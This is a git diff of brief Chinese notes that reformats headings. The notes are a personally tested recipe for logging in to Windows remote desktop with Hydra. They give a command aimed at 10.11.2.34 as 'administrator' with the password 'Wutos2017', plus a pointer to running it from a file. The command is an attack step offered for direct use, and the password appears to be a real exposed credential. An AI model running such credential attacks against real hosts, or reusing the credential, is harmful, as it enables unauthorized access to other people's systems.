@@ -1,7 +1,9 @@
-#亲测试成功
+亲测试成功
+=================
 可参照：https://www.cnblogs.com/HC2018/articles/10125347.html
 
 亲测命令
+=================
 在当前路径执行即可
 hydra -l administrator -p Wutos2017 10.11.2.34 rdp
 也可以通过查询文件执行
